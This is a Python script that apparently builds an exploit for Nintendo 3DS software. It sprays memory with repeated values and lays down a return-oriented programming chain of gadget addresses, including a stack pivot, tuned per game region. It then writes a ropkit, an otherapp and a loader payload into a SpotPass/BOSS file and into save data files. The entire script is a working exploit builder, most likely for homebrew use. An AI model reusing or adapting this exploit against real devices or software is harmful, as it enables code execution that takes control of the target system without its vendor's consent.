import os,sys,struct
#1bf70
size=0x127c1c
d=0x33333334
out=bytearray(size)
OFFSET=0

spotpass=bytearray(0x3000)
for i in range(0,0x3000-1,4):
	temp=0x3000-i
	spotpass[i:i+4]=struct.pack("<I",temp)
	
for i in range(0,0x2840-1,4):
	temp=0x2840-i
	spotpass[i:i+4]=struct.pack("<I",temp)

redirect_offs=0x1bf5c
linearmem_target=0x1574ed10 #1574ff10-ESP #1574f610-FRA #1574f810-GER #0ffffc58-15750190-ITL #1574f290-NED #1574f990-POR #1574f290-CYR   #0x1574d010-???
linearmem_target=0x1574ed10 #44440600-ESP #44440f00-FRA #44440d00-GER #0ffffc58-15750190-ITL #44441280-NED #44440b80-POR #44441280-CYR
pop_r4r7pc=0x100e60
pivot_args=0x244e08
pivot=0x12f6c0
pivot_r3=0x1144e4

PAYLOAD_ADDR=0x1579f200        #0x1579fd00 0x1579dd00-eng # 0x1579ef00-esp 0x1579e600-fra 0x1579e800-ger #0x1579f180-itl 0x1579e280-ned 0x1579e980-por 0x1579e280-rus
POP_R1PC=0x00109d6c            #0x1579dd00-eng +580 0x1579e280-ned +0 0x1579e280-rus +380 0x1579e600-fra +200 0x1579e800-ger +180 0x1579e980-por +580 0x1579ef00-esp +280 #0x1579f180-itl
POP_R0PC=0x0011a698            #f180-dd00=1480   f180-2800   
ROP_POPPC=0x001017b8
GARBAGE=0x44444444

av=[0x1579dd00,0x1579e280,0x1579e280,0x1579e600,0x1579e800,0x1579e980,0x1579ef00,0x1579f180]
temp=0
for i in av:
	temp+=(i+0x1400)
a=temp//len(av)
print("%x avg" % a)

#0179d80c 1579d80c 0x103704: pop {r4, lr} ; bx r1 ; (106 found)

def write32(offset, value):
	global out
	out[offset:offset+4]=struct.pack("<I",value)
	
def rop(value):
	global out, OFFSET
	out[OFFSET:OFFSET+4]=struct.pack("<I",value)
	OFFSET+=4
	
def addr_convert(addr):
	c=(addr - 0x678d88) // 8
	print(hex(c))
	return c
	

for i in range(0,size-1,4):
	temp=d
	out[i:i+4]=struct.pack("<I",temp)
	
write32(redirect_offs, addr_convert(PAYLOAD_ADDR))

out[0x1bf70:0x1bf70+0x20]=b"\x00"*0x20

webstrand=struct.pack("<IIIII", PAYLOAD_ADDR, pop_r4r7pc, pivot_args, pivot, pivot_r3)

for i in range(0x2800, 0x3000-4, 4):
	spotpass[i:i+4]=struct.pack("<I", ROP_POPPC)

for i in range(0, 0x2800-1, 0x20):
	spotpass[i:i+0x14]=webstrand
	

with open("3ds_ropkit/ropkit.bin","rb") as f:
	ropkit=f.read(0x1000)
with open("3ds_ropkit/otherapp.bin","rb") as f:
	oapp=f.read()+b"\x00"*0x1000
	oapp=oapp[:0x2000] #lazy padding strategy but don't care
with open("3ds_ropkit/otherappn.bin","rb") as f:
	oappn=f.read()+b"\x00"*0x1000
	oappn=oappn[:0x2000]
print("ropkit:%x  +otherapp_old:%x" % (len(ropkit), len(ropkit+oapp)))

with open("loader/loader.bin","rb") as f:
	loader=f.read()

with open("307/boss/wTRu2!!!(`!!+s(@","rb+") as f:
	f.seek(0x700-0xc)
	f.write(spotpass)
	f.seek(0x700-0xc+0x2c00)
	f.write(loader)

payload=ropkit+oapp+oappn
with open("307/user/ubll.lst","wb") as f:
	f.write(payload)

with open("307/user/data.dat","wb") as f:
	f.write(out)